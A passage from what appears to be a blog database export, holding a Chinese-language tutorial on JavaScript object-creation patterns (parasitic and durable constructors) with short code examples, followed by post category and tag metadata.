rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;<br> &nbsp; &nbsp;<br>&nbsp; o.job = job;<br> &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//“wei”</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“|”</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“red”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“blue”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“green”</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“weiqi”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p></p>\n<blockquote>\n<p>转自：<a href=\"http://blog.csdn.net/u014346301/article/details/52204967\">http://blog.csdn.net/u014346301/article/details/52204967</a></p>\n</blockquote>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ciubisk8v00023son0swr7kwa","category_id":"ciubisk9700063sonhc3mnmwz","_id":"ciubisk9w000f3sonuteh5cbh"},{"post_id":"ciubisk9d00083son1auam8uv","category_id":"ciubisk9l000b3songvr94v5s","_id":"ciubiska3000m3sonzqcssiy6"},{"post_id":"ciubisk9i00093sondq3kxxeh","category_id":"ciubisk9z000h3soncaixc7od","_id":"ciubiskab000s3sonhqbxh860"},{"post_id":"ciubisk9x000g3sonqkta92ab","category_id":"ciubiska4000n3son1mlkdx27","_id":"ciubiskag000z3sonujsxf65f"},{"post_id":"ciubiska2000l3sonexik6et9","category_id":"ciubiskab000u3sonylnec1vl","_id":"ciubiskao00163sonqj9oh8zx"},{"post_id":"ciubiskah00103son400hidi2","category_id":"ciubisk9l000b3songvr94v5s","_id":"ciubiskaq001a3sonqcure9ju"},{"post_id":"ciubiskac000w3sonqjg23dxb","category_id":"ciubiskaj00113sonnqx2ofoy","_id":"ciubiskaw001e3son0j76vr5d"},{"post_id":"ciubiskau001d3sonwneh2k5g","category_id":"ciubiskb1001i3sonu642y4i7","_id":"ciubiskbj001t3sonv9u9pmbu"},{"post_id":"ciubiskbi001r3sonr0wdvrzz","category_id":"ciubiskaj00113sonnqx2ofoy","_id":"ciubiskbl001w3son9zr80dnl"},{"post_id":"ciubiskb4001m3sonuxj9jx0q","category_id":"ciubiskbi001q3son7f150bro","_id":"ciubiskbl001z3sonj9cs40kx"},{"post_id":"ciubiskco002e3sonlbfgij73","category_id":"ciubisk9l000b3songvr94v5s","_id":"ciubiskcr002g3sonuyhhyu39"}],"PostTag":[{"post_id":"ciubisk8v00023son0swr7kwa","tag_id":"ciubisk9c00073son3i94ir6p","_id":"ciubisk9o000d3sonvkylbz7s"},{"post_id":"ciubisk9000043son0dw79g4p","tag_id":"ciubisk9m000c3sontx5mbu31","_id":"ciubiska2000k3sonu8onwudf"},{"post_id":"ciubisk9d00083son1auam8uv","tag_id":"ciubiska0000i3sonqwegissr","_id":"ciubiska6000q3son700w9gt4"},{"post_id":"ciubiska5000p3sonkitzo7uo","tag_id":"ciubisk9m000c3sontx5mbu31","_id":"ciubiskab000t3sonrssu77tw"},{"post_id":"ciubisk9i00093sondq3kxxeh","tag_id":"ciubiska4000o3sonmiwn8im4","_id":"ciubiskad000x3sonajf1efgv"},{"post_id":"ciubiskae000y3sontrgyfyvz","tag_id":"ciubisk9m000c3sontx5mbu31","_id":"ciubiskak00133sonpnqm6w1x"},{"post_id":"ciubisk9k000a3son3bnvzhux","tag_id":"ciubiskab000v3sonb44sihg0","_id":"ciubiskao00153sonpnqc0b9a"},{"post_id":"ciubiskah00103son400hidi2","tag_id":"ciubiska0000i3sonqwegissr","_id":"ciubiskaq00193sonakma7gtn"},{"post_id":"ciubisk9p000e3son57xyio31","tag_id":"ciubiskab000v3sonb44sihg0","_id":"ciubiskau001c3sonle1q0fyg"},{"post_id":"ciubiskar001b3sonorlwzjsc","tag_id":"ciubisk9m000c3sontx5mbu31","_id":"ciubiskax001g3sonuenevrcd"},{"post_id":"ciubisk9x000g3sonqkta92ab","tag_id":"ciubiskaq00183sonww8i6lfr","_id":"ciubiskb1001j3sonzg3p7vu1"},{"post_id":"ciubiska0000j3sonrvnktuo5","tag_id":"ciubiskaq00183sonww8i6lfr","_id":"ciubiskb5001n3sone2v3ndtz"},{"post_id":"ciubiska2000l3sonexik6et9","tag_id":"ciubiskb3001l3sonq7as6bhn","_id":"ciubiskbj001s3sone1jjb2f3"},{"post_id":"ciubiskbi001r3sonr0wdvrzz","tag_id":"ciubiskab000v3sonb44sihg0","_id":"ciubiskbk001v3son8o4qd75p"},{"post_id":"ciubiska7000r3son4kjo1c7d","tag_id":"ciubiskab000v3sonb44sihg0","_id":"ciubiskbl001x3sonwmp25zpg"},{"post_id":"ciubiskac000w3sonqjg23dxb","tag_id":"ciubiskab000v3sonb44sihg0","_id":"ciubiskbl00203sonipylzdr8"},{"post_id":"ciubiskal00143sonz4gv8qip","tag_id":"ciubiskbl001y3sonxt7tzez4","_id":"ciubiskbm00223sonygujz2li"},{"post_id":"ciubiskao00173sone73gi55v","tag_id":"ciubiskbm00213sonmybgzofe","_id":"ciubiskbn00243sonigyfu5qv"},{"post_id":"ciubiskau001d3sonwneh2k5g","tag_id":"ciubiskbl001y3sonxt7tzez4","_id":"ciubiskbo00263sonc73ysvd3"},{"post_id":"ciubiskax001h3sonc4w83rmb","tag_id":"ciubiskbl001y3sonxt7tzez4","_id":"ciubiskbp00283son3k2fu2w4"},{"post_id":"ciubiskb2001k3sonqgvvityf","tag_id":"ciubiskbo00273sonmz3so5eb","_id":"ciubiskbq002a3sonaz7c2b5k"},{"post_id":"ciubiskb4001m3sonuxj9jx0q","tag_id":"ciubiskbp00293son3oq8j6xu","_id":"ciubiskbr002c3sonoh2hfc8b"},{"post_id":"ciubiskb6001o3soniovczzbb","tag_id":"ciubiskbl001y3sonxt7tzez4","_id":"ciubiskbr002d3sonstbgbpjg"},{"post_id":"ciubiskco002e3sonlbfgij73","tag_id":"ciubiska0000i3sonqwegissr","_id":"ciubiskcq002f3son0wwwxn98"}],"Tag":[{"name":"docker","_id":"ciubisk9c00073son3i94ir6p"},{"name":"Linux","_id":"ciubisk9m000c3sontx5mbu31"},{"name":"Web","_id":"ciubiska0000i3sonqwegissr"},{"name":"Java","_id":"ciubiska4000o3sonmiwn8im4"},{"name":"Hack","_id":"ciubiskab000v3sonb44sihg0"},{"name":"Mac","_id":"ciubiskaq00183sonww8i6lfr"},{"name":"Sql","_id":"ciubiskb3001l3sonq7as6bhn"},{"name":"Raspberry","_id":"ciubiskbl001y3sonxt7tzez4"},{"name":"杂谈","_id":"ciubiskbm00213sonmybgzofe"},{"name":"其他","_id":"ciubiskbo00273sonmz3so5eb"},{"name":"笑话","_id":"ciubiskbp00293son3oq8j6xu"}]}}